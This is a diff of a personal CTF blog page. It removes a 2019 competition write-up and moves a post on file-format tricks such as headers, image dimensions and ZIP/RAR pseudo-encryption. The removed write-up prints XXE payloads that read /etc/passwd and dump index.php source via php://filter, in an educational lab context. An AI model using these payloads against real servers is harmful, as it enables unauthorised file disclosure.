@@ -134,184 +134,6 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-CTF比赛—2019网络与信息安全领域专项赛WriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="knlvre.github.io/2019/08/15/CTF比赛—2019网络与信息安全领域专项赛WriteUp/">2019网络与信息安全领域专项赛 — 线上赛WriteUp</a>
-    </h1>
-  
-
-        
-        <a href="knlvre.github.io/2019/08/15/CTF比赛—2019网络与信息安全领域专项赛WriteUp/" class="archive-article-date">
-  	<time datetime="2019-08-14T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>没报名比赛，用同学的账号做一下题目</p>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-Game"><a href="#1-Game" class="headerlink" title="1. Game"></a>1. Game</h2><p>题目进去是一个游戏机，只有<code>Shuffle</code>和<code>Stop</code>两个按钮可以点击，没什么作用</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/6-1.png" alt="6-1"></p>
-<p>查看源码，其他没什么用，但是发现一个<code>js文件（cqg.js）</code>，点击查看源代码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/6-2.png" alt="6-2"></p>
-<p>在末尾发现了关键代码</p>
-<pre><code class="javascript">if(score == 15){
-    $.ajax({
-        url: &#39;score.php&#39;,
-        type: &#39;POST&#39;,
-        data: &#39;score=&#39;+score,
-        success: function(data){
-            var data = data;
-            $(&quot;#output&quot;).text(data);
-        }
-    })
-</code></pre>
-<p>直接访问<code>score.php</code>，抓包修改为<code>POST</code>方式，提交<code>score=15</code>，直接拿到了flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/6-3.png" alt="6-3"></p>
-<h2 id="2-who-are-you"><a href="#2-who-are-you" class="headerlink" title="2. who_are_you?"></a>2. who_are_you?</h2><p>本题考察XXE漏洞的利用，参考文章：<a href="https://blog.csdn.net/weixin_39997829/article/details/79654861" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39997829/article/details/79654861</a></p>
-<p><strong>Q1</strong>：什么是XXE漏洞？</p>
-<p><strong>A1</strong>：XML外部实体（XML External Entity），XXE漏洞一般称为xml外部实体攻击漏洞</p>
-<p>.</p>
-<p><strong>Q2</strong>：xml语言是什么？</p>
-<p><strong>A2</strong>：XML百度的解释：可扩展<a href="https://baike.baidu.com/item/标记语言" target="_blank" rel="noopener">标记语言</a>，<a href="https://baike.baidu.com/item/标准通用标记语言" target="_blank" rel="noopener">标准通用标记语言</a>的子集，是一种用于标记电子文件使其具有结构性的标记语言</p>
-<p>下面的例子中，<code>username</code>、<code>password</code>、<code>address</code>被称为xml的元素</p>
-<pre><code class="xml">&lt;?xml version=&quot;1..0&quot;?&gt;
-
-&lt;student&gt;
-
-&lt;username&gt;xxx&lt;/username&gt;
-
-&lt;password&gt;yyy&lt;/password&gt;
-
-&lt;address&gt;zzz&lt;/address&gt;
-
-&lt;/student&gt;
-</code></pre>
-<p>有些XML文档包含system标识符定义的<code>实体</code>，这些XML文档会在DOCTYPE头部标签中呈现。这些定义的<code>实体</code>能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了<code>XML实体</code></p>
-<p>这一段代码，其中<code>Entity</code>就是外部实体，我们可以通过这个参数来访问<code>file://etc/passwd</code>的内容，因为我们web服务器在解析xml文档的过程中，实体<code>Entity</code>的值会直接被替换成file://etc/passwd。关键字<code>SYSTEM</code>会告诉XML解析器，Entity的实体值将会从后面的URL获取，也就是我们所替换的file:///etc/passwd文件，其实这个过程就是XML实体攻击过程</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!DOCTYPE what_ever[
-&lt;!ENTITY Entity SYSTEM &quot;file://etc/passwd&quot;&gt;
-]&gt;
-&lt;feedback&gt;&lt;author&gt;&amp;Entity;&lt;/author&gt;&lt;/feedback&gt;
-</code></pre>
-<p>.</p>
-<p><strong>Q3</strong>：怎么识别存在xml外部实体攻击漏洞（XXE）？</p>
-<p><strong>A3</strong>：最快速的方法就是通过burpsuit抓取关键的包，如果包中存在xml实体，并且服务器端如果解析了这个实体，那么就很可能存在XXE漏洞，接下来就按本道题来做个例子</p>
-<p>首先我们在输入框内填入：<code>&quot;XXE_Entity_Test&quot;</code>，点击<code>Submit</code>，抓下这个包</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-1.png" alt="5-1"></p>
-<p>可以看到该包POST的内容为：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;feedback&gt;&lt;author&gt;XXE_Entity_Test&lt;/author&gt;&lt;/feedback&gt;
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-2.png" alt="5-2"></p>
-<p>发现了xml外部实体（即XXE_Entity_Test），点击Go，在Response中我们可以确认web应用正在解析xml的内容，接受用户特定或者自定义的输入，然后呈现给用户</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-3.png" alt="5-3"></p>
-<p>为了验证，我们将实体改为<code>XXE_Entity_Test_2</code>，可以看到返回结果随着我们的改变而改变</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-4.png" alt="5-4"></p>
-<p>可以看到应用程序确实是直接解析了xml，那么如果xml文档中有一个参数是用来调用远程服务器的内容，并且这个参数是可控的？在构造这个参数之前，我们需要知道这个实体的名称，方法就是查看源代码。如本题，实体名称为<code>name</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-5.png" alt="5-5"></p>
-<p>知道实体名称后，就可以构造参数了（php://filter/read=convert.base64-encode/resource=index.php），直接通过<code>php伪协议</code>去读取<code>index.php</code>的源代码</p>
-<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!DOCTYPE what_ever[
-&lt;!ENTITY name SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;
-]&gt;
-&lt;feedback&gt;&lt;author&gt;&amp;name;&lt;/author&gt;&lt;/feedback&gt;
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-6.png" alt="5-6"></p>
-<p>Base64解码之后，直接在源码中看到了flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/5-7.png" alt="5-7"></p>
-<p><code>flag{26a4b2cb-28c3-42f5-81a9-faafda680763}</code></p>
-<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>一共4道题目</p>
-<p>考查知识点有：DNS查询、GIF帧分析、图片通道、社会主义核心价值观编码、Ook!编码</p>
-<h2 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1. 签到题"></a>1. 签到题</h2><p>只给出<code>I&#39;m gamectf.com, I love TXT.</code>的提示</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/1-1.png" alt="1-1"></p>
-<p>是<code>DNS查询题目</code>，到这个网站跑一下就出来了：<a href="https://dnslookup.online/txt.html" target="_blank" rel="noopener">https://dnslookup.online/txt.html</a></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/1-2.png" alt="1-2"></p>
-<p><code>flag{welcome_TXT}</code></p>
-<h2 id="2-七代目"><a href="#2-七代目" class="headerlink" title="2. 七代目"></a>2. 七代目</h2><p>下载下来一个<code>ZIP压缩文件</code>，解压出来<code>七代目.gif</code>，但是图片打不开，用<code>Winhex</code>查看发现文件头错误（将原本的<code>89504e47</code>改为<code>47494638</code>）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/2-1.png" alt="2-1"></p>
-<p>用图片浏览器打开时发现图片并没有动。打开<code>Kali</code>，使用命令：</p>
-<pre><code>identify -format &quot;%s %T \n&quot; 七代目.gif
-</code></pre><p>发现图片中第7帧的间隙与其他的不同，再结合题目名称——七代目，这个第7帧应该有问题</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/2-2.png" alt="2-2"></p>
-<p>Stegsolve保存第7帧并打开，将通道切换至<code>Colour Inversion(Xor)</code>，直接看到flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/2-3.png" alt="2-3"></p>
-<p><code>flag{49bdbe-able-47-9f66-a533331e6}</code></p>
-<h2 id="3-亚萨西"><a href="#3-亚萨西" class="headerlink" title="3. 亚萨西"></a>3. 亚萨西</h2><p>下载下来一个<code>ZIP压缩文件</code>，解压时需要密码。刚开始以为是伪加密，后来发现不是。在文件末尾发现了解压密码<code>loli</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/3-1.png" alt="3-1"></p>
-<p>解压下来<code>timg.jpg</code>，在文件末尾发现<code>Ook!编码</code></p>
-<p>Ps：解压时发现Winrar会文件头报错，但是7-zip可以直接忽略</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/3-2.png" alt="3-2"></p>
-<p>直接到在线网站去解密：<a href="http://tool.bugku.com/brainfuck/?wafcloud=2&amp;tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">http://tool.bugku.com/brainfuck/?wafcloud=2&amp;tdsourcetag=s_pcqq_aiomsg</a></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/3-3.png" alt="3-3"></p>
-<p><code>flag{f71d6bca-3210-4a31-9feb-1768a65a33db}</code></p>
-<h2 id="4-24word"><a href="#4-24word" class="headerlink" title="4. 24word"></a>4. 24word</h2><p>下载下来一个<code>ZIP压缩文件</code>，解压出来<code>24w.png</code>。<code>foremost</code>跑出来一个zip压缩文件和一个png图片</p>
-<p>ZIP文件解压需要密码；PNG图片里面是社会主义核心价值观</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/4-1.png" alt="4-1"></p>
-<p>这个是<code>社会主义核心价值观编码</code>，到在线网站：<a href="https://z.duoluosb.com/" target="_blank" rel="noopener">https://z.duoluosb.com/</a></p>
-<p>密文：<code>自由和谐公正诚信平等公正自由公正平等平等公正公正民主公正诚信文明法治平等公正平等法治和谐</code></p>
-<p>解出：<code>CodeValues</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/4-2.png" alt="4-2"></p>
-<p>用解出的拿去作为ZIP密码，解压得到<code>24c.jpg</code>，打开图片发现藏着一个二维码，微信扫一下直接得到flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9B/4-3.png" alt="4-3"></p>
-<p><code>flag{24_word_m4n7ra}</code></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF比赛</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="knlvre.github.io/2019/08/15/CTF比赛—2019网络与信息安全领域专项赛WriteUp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-CTF比赛—2019ISCC线下赛WriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -2186,152 +2008,6 @@ admin_name=AdMiNhEhE&amp;admin_passwd=password&quot; union select (select group_
 
 
   
-    <article id="post-BugKuCTF—杂项题中常见的文件操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="knlvre.github.io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">BugKuCTF — 杂项题中常见的文件知识点和操作</a>
-    </h1>
-  
-
-        
-        <a href="knlvre.github.io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/" class="archive-article-date">
-  	<time datetime="2019-03-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="常见的文件头"><a href="#常见的文件头" class="headerlink" title="常见的文件头"></a>常见的文件头</h3><pre><code>JPEG (jpg)，文件头：FF D8 FF E0
-
-PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 82
-
-7z：37 7A BC AF 27 1C
-
-GIF (gif)：47 49 46 38 39 61
-
-ZIP Archive (zip)：50 4B 03 04
-
-RAR Archive (rar)：52 61 72 21
-
-Wave (wav)：57 41 56 45
-
-AVI (avi)：41 56 49 20
-
-Real Audio (ram)：2E 72 61 FD
-
-Real Media (rm)：2E 52 4D 46
-
-MPEG (mpg)：00 00 01 BA
-
-MPEG (mpg)：00 00 01 B3
-</code></pre><hr>
-<h3 id="修改图片的高度和宽度"><a href="#修改图片的高度和宽度" class="headerlink" title="修改图片的高度和宽度"></a>修改图片的高度和宽度</h3><h4 id="PNG图片"><a href="#PNG图片" class="headerlink" title="PNG图片"></a>PNG图片</h4><p>涉及题目：杂项题第三题</p>
-<p>图片格式：</p>
-<pre><code>（固定）：8个字节（0-7），89 50 4E 47 0D 0A 1A 0A为png的文件头
-
-（固定）：4个字节（8-b），00 00 00 0D（即为十进制的13）代表数据块的长度为13
-
-（固定）：4个字节（c-f），49 48 44 52（即为ASCII码的IHDR）,文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成，
-
-（可变）：13个字节（0-c），这13个字节既文件头数据块。1.前4个字节代表该图片的宽；2.后4个字节代表该图片的高；3.后5个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method
-
-（可变）：剩余三字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行CRC计算得到
-</code></pre><p>所以，撇掉前16个字节（第一行）后，修改第17-20字节为修改高度，修改第21-24字节为修改宽度</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/2-3.png" alt></p>
-<h4 id="JPEG图片"><a href="#JPEG图片" class="headerlink" title="JPEG图片"></a>JPEG图片</h4><p>涉及题目：杂项题第二十九题</p>
-<p>图片格式：</p>
-<pre><code>FFD8：图片起始标示位
-FFC0：SOFO，Start of Frame，帧图像开始，修改高度宽度应注意的标示位
-FFD9：图片结束标识位
-</code></pre><p>JPEG（JPG）图片的高度和宽度的位置不像PNG图片那样是固定的</p>
-<p>而是根据图片的不同而不同位置，但是却也有规律可以找</p>
-<p>修改JPG图片的高度和宽度要找0xFFC0（SOFO，Start of Frame，帧图像开始）标示位，然后往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度。但要注意的是也有图片需要找0xFFC2，就像第二十九题</p>
-<p>所以使用winhex的情况下，搜索Hex值（Ctrl+Alt+X）：FFC0或FFC2，一般位置比较靠前</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-7.png" alt></p>
-<p>标示位往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度</p>
-<p>如下图：66是高度，781是宽度，和图片属性里面的一样</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-8.png" alt></p>
-<hr>
-<h3 id="压缩文件伪加密"><a href="#压缩文件伪加密" class="headerlink" title="压缩文件伪加密"></a>压缩文件伪加密</h3><h4 id="ZIP文件"><a href="#ZIP文件" class="headerlink" title="ZIP文件"></a>ZIP文件</h4><p>讲到伪加密，需要对ZIP文件的格式加上一些的补充：</p>
-<p>一格zip文件有三个部分组成：压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志</p>
-<pre><code>1.压缩源文件数据区：
-开头也就是前面内容提到，ZIP文件开头标识：
-50 4B 03 04
-
-2.压缩源文件目录区：
-50 4B 01 02：目录中文件文件头标记
-3F 00：压缩使用的 pkware 版本 
-14 00：解压文件所需 pkware 版本 
-00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）
-
-3.压缩源文件目录结束标志 ：
-50 4B 05 06
-</code></pre><p>简单创建一个flag.txt，压缩成ZIP格式并且不设密码，用winhex打开，全局方式位标识确实是00 00</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-1.png" alt="11-1"></p>
-<p>修改后，再次想要解压时，就提示需要输入密码了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-2.png" alt="11-2"></p>
-<h4 id="RAR文件"><a href="#RAR文件" class="headerlink" title="RAR文件"></a>RAR文件</h4><p>涉及题目：分析题第五题</p>
-<p>RAR文件的伪加密比较少见，没有深入调查，只根据题目做简单的介绍</p>
-<p>方法：将文件头0x1674后面的0x84改为0x80（84为加密，80/20不加密）</p>
-<hr>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF-Misc</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="knlvre.github.io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -2776,6 +2452,152 @@ if (isset($_POST[&#39;name&#39;]) and isset($_POST[&#39;password&#39;])){
 
 
   
+    <article id="post-BugKuCTF—杂项题中常见的文件操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="knlvre.github.io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">BugKuCTF — 杂项题中常见的文件知识点和操作</a>
+    </h1>
+  
+
+        
+        <a href="knlvre.github.io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/" class="archive-article-date">
+  	<time datetime="2019-03-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="常见的文件头"><a href="#常见的文件头" class="headerlink" title="常见的文件头"></a>常见的文件头</h3><pre><code>JPEG (jpg)，文件头：FF D8 FF E0
+
+PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 82
+
+7z：37 7A BC AF 27 1C
+
+GIF (gif)：47 49 46 38 39 61
+
+ZIP Archive (zip)：50 4B 03 04
+
+RAR Archive (rar)：52 61 72 21
+
+Wave (wav)：57 41 56 45
+
+AVI (avi)：41 56 49 20
+
+Real Audio (ram)：2E 72 61 FD
+
+Real Media (rm)：2E 52 4D 46
+
+MPEG (mpg)：00 00 01 BA
+
+MPEG (mpg)：00 00 01 B3
+</code></pre><hr>
+<h3 id="修改图片的高度和宽度"><a href="#修改图片的高度和宽度" class="headerlink" title="修改图片的高度和宽度"></a>修改图片的高度和宽度</h3><h4 id="PNG图片"><a href="#PNG图片" class="headerlink" title="PNG图片"></a>PNG图片</h4><p>涉及题目：杂项题第三题</p>
+<p>图片格式：</p>
+<pre><code>（固定）：8个字节（0-7），89 50 4E 47 0D 0A 1A 0A为png的文件头
+
+（固定）：4个字节（8-b），00 00 00 0D（即为十进制的13）代表数据块的长度为13
+
+（固定）：4个字节（c-f），49 48 44 52（即为ASCII码的IHDR）,文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成，
+
+（可变）：13个字节（0-c），这13个字节既文件头数据块。1.前4个字节代表该图片的宽；2.后4个字节代表该图片的高；3.后5个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method
+
+（可变）：剩余三字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行CRC计算得到
+</code></pre><p>所以，撇掉前16个字节（第一行）后，修改第17-20字节为修改高度，修改第21-24字节为修改宽度</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/2-3.png" alt></p>
+<h4 id="JPEG图片"><a href="#JPEG图片" class="headerlink" title="JPEG图片"></a>JPEG图片</h4><p>涉及题目：杂项题第二十九题</p>
+<p>图片格式：</p>
+<pre><code>FFD8：图片起始标示位
+FFC0：SOFO，Start of Frame，帧图像开始，修改高度宽度应注意的标示位
+FFD9：图片结束标识位
+</code></pre><p>JPEG（JPG）图片的高度和宽度的位置不像PNG图片那样是固定的</p>
+<p>而是根据图片的不同而不同位置，但是却也有规律可以找</p>
+<p>修改JPG图片的高度和宽度要找0xFFC0（SOFO，Start of Frame，帧图像开始）标示位，然后往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度。但要注意的是也有图片需要找0xFFC2，就像第二十九题</p>
+<p>所以使用winhex的情况下，搜索Hex值（Ctrl+Alt+X）：FFC0或FFC2，一般位置比较靠前</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-7.png" alt></p>
+<p>标示位往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度</p>
+<p>如下图：66是高度，781是宽度，和图片属性里面的一样</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-8.png" alt></p>
+<hr>
+<h3 id="压缩文件伪加密"><a href="#压缩文件伪加密" class="headerlink" title="压缩文件伪加密"></a>压缩文件伪加密</h3><h4 id="ZIP文件"><a href="#ZIP文件" class="headerlink" title="ZIP文件"></a>ZIP文件</h4><p>讲到伪加密，需要对ZIP文件的格式加上一些的补充：</p>
+<p>一格zip文件有三个部分组成：压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志</p>
+<pre><code>1.压缩源文件数据区：
+开头也就是前面内容提到，ZIP文件开头标识：
+50 4B 03 04
+
+2.压缩源文件目录区：
+50 4B 01 02：目录中文件文件头标记
+3F 00：压缩使用的 pkware 版本 
+14 00：解压文件所需 pkware 版本 
+00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）
+
+3.压缩源文件目录结束标志 ：
+50 4B 05 06
+</code></pre><p>简单创建一个flag.txt，压缩成ZIP格式并且不设密码，用winhex打开，全局方式位标识确实是00 00</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-1.png" alt="11-1"></p>
+<p>修改后，再次想要解压时，就提示需要输入密码了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-2.png" alt="11-2"></p>
+<h4 id="RAR文件"><a href="#RAR文件" class="headerlink" title="RAR文件"></a>RAR文件</h4><p>涉及题目：分析题第五题</p>
+<p>RAR文件的伪加密比较少见，没有深入调查，只根据题目做简单的介绍</p>
